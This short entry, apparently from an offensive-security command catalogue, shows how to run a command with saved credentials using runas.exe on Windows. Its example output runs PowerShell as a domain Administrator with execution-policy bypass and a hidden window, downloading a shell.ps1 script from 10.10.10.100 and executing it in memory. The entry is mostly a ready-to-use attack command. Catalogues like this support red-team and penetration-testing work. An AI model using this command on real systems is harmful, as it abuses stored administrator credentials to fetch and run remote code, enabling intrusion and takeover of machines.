---
id: c5359a0c-7ae4-44d8-b46c-537e5e8eb0dd
name: runas.exe Execute a Command using Saved Credentials
type: command
executor: command_prompt
data: runas.exe /profile /user:$_DOMAIN\$_USERNAME /savedcred "$_COMMAND"
output: C:\>runas.exe /profile /user:ACCESS\Administrator /savedcred "powershell -ep
  bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
created_at: '2019-12-12T20:07:11.667949+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# runas.exe Execute a Command using Saved Credentials

```command_prompt
runas.exe /profile /user:$_DOMAIN\$_USERNAME /savedcred "$_COMMAND"
```

## Expected Output

```
C:\>runas.exe /profile /user:ACCESS\Administrator /savedcred "powershell -ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
```


